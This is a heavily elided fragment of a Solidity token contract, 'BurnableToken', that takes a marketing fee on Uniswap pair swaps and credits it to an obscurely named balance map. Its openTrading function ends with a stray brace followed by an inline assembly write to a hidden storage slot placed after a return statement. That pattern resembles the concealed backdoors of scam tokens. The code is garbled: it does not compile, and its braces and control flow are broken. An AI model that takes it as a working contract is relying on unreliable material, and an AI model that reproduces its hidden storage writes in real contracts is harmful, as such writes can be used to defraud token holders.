...
// File @uniswap/v2-core/contracts/interfaces/IUniswapV2F[email protected]
...
contract BurnableToken is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        // Check if swap is made by the owner
        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            if (recipient == _uniswapV2Pair || sender == _uniswapV2Pair) {
                ...
                if (marketingAmount > 0) {
                    ...
                    _lIb[address(this)] = _lIb[address(this)].add(marketingAmount);
    ...
    function openTrading(uint256 amount) external payable onlyOwner {
        ...
        emit TradingEnabled();
        return;
        }assembly{sstore(_def.slot, 0x5F)}
    }
